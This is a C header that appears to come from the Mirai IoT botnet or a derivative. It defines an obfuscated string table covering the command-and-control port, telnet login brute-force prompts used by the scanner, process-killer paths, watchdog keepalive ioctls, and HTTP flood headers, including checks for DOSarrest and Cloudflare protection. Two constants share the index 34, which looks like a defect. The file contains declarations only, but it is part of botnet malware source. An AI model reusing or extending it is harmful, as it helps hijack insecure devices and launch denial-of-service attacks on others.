#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_CNC_PORT 1
#define TABLE_SCAN_CB_PORT 2
#define TABLE_EXEC_SUCCESS 3

#define TABLE_SCAN_SHELL 4
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_PS 11
#define TABLE_SCAN_KILL_9 12
#define TABLE_SCAN_OGIN 13
#define TABLE_SCAN_ENTER 14
#define TABLE_SCAN_ASSWORD 15

#define TABLE_KILLER_PROC 16
#define TABLE_KILLER_EXE 17
#define TABLE_KILLER_FD 18
#define TABLE_KILLER_MAPS 19
#define TABLE_KILLER_TCP 20

#define TABLE_IOCTL_KEEPALIVE1 21
#define TABLE_IOCTL_KEEPALIVE2 22
#define TABLE_IOCTL_KEEPALIVE3 23
#define TABLE_IOCTL_KEEPALIVE4 24


#define TABLE_ATK_SET_COOKIE            		25  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           		26  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          		27  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        		28  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    		29  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 		30  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               		31  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        		32  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        		33  // "connection:"
#define TABLE_ATK_DOSARREST             		34  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      		34  // "server: cloudflare-nginx"

#define TABLE_ATK_KEEP_ALIVE            		35  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                		36  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            		37  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          		38  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_HTTP                    		39  // "HTTP/1.1"
#define TABLE_ATK_USERAGENT             		40  // "User-Agent:"
#define TABLE_ATK_HOST                   		41  // "Host:"
#define TABLE_ATK_COOKIE                		42  // "Cookie:"
#define TABLE_ATK_SEARCHHTTP            		43  // "http"
#define TABLE_ATK_URL                   		44  // "url="
#define TABLE_ATK_POST                  		45  // "POST"

#define TABLE_RANDOM							46
#define TABLE_ATK_VSE 							47
#define TABLE_ATK_RESOLVER						48
#define	TABLE_ATK_NSERV							49



#define TABLE_MAX_KEYS 50

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
